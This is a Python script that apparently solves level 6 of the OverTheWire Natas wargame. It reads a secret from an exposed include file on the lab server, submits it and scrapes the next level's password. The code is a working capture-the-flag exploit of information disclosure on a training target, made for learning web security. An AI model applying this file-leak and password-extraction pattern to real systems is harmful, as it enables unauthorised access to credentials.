import re
import requests
from halo import Halo


def get_natas7_password(natas6_password):
    URL = "http://natas6.natas.labs.overthewire.org"
    URL_SECRET = "http://natas6.natas.labs.overthewire.org/includes/secret.inc"
    spinner = Halo(text='The password for natas 7 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas6", natas6_password)

    # Get secret
    request = session.get(URL_SECRET)
    secret = re.findall(r"([a-zA-Z]{19})", request.text)[0]

    # Get password
    data = {"secret": secret, "submit": "true"}
    request = session.post(URL, data=data)
    natas7_password = re.findall(r"([a-zA-Z\d]{32})", request.text)[1]

    spinner.succeed(text="The password for natas 7 is: " + natas7_password)

    return natas7_password


if __name__ == '__main__':
    natas6_password = ""  # Put here the password for natas6 here
    get_natas7_password(natas6_password)
